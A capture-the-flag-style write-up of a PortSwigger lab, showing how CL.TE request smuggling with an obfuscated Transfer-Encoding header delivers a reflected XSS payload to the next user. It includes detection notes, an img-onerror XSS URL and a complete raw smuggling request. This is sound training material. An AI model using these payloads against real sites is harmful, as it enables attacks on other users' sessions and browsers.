# [Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)

## Lab

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the `User-Agent` header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes `alert(1)`.

## Detected CL.TE

- burpsuite active scan: detected http request smuggling
- burpsuite `HTTP request smuggler` extension: detected CL.TE
- smuggler.py: `[tabprefix1]   : Potential CLTE Issue Found`

## Detected reflected xss

```url
https://id.web-security-academy.net/post/comment/confirmation?postId=%22%3E%3Cimg+src=1+onerror=print()%3E
```

## Solutions

```http
POST / HTTP/1.1^M$
Host: 0a5200e0044d2ffac16c0354000c00a6.web-security-academy.net^M$
Cookie: session=RgD3KWka9NMaoRdT89t8zFQn98bLTSSs^M$
Content-Type: application/x-www-form-urlencoded^M$
Content-Length: 96^M$
tRANSFER-ENCODING: chunked^M$
^M$
0^M$
^M$
GET /post/comment/confirmation?postId=%22%3E%3Cimg+src=1+onerror=alert(1)%3E HTTP/1.1^M$
foo: 
```
